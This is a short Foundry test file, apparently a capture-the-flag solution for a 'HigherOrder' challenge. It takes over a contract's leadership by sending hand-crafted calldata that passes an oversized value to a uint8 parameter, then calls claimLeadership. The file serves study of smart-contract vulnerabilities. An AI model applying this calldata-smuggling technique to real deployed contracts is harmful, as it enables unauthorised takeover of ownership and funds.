// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface HigherOrder {
	function registerTreasury(uint8) external;
	function claimLeadership() external;	
}

import {Test,console} from "forge-std/Test.sol";

contract CounterTest is Test {
	address public player = makeAddr("0xPlayer");
	address public admin = makeAddr("0xAdmin");
	HigherOrder target;

    function setUp() public {
		vm.prank(admin);
		address addr = deployCode("Target.sol:HigherOrder");
		target = HigherOrder(addr);
    }

	function test_stealOwnership() public {
		bytes memory data = hex"211c85abffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
		vm.deal(player, 100 ether);
		vm.startPrank(player);
		(bool success,) = address(target).call(data);
		require(success);
		target.claimLeadership();
		bytes memory data2 = hex"5b3e8fe70000000000000000000000000000000000000000000000000000000000000000";
		(bool success1,) = address(target).call(data2);
		require(success1);
	}
}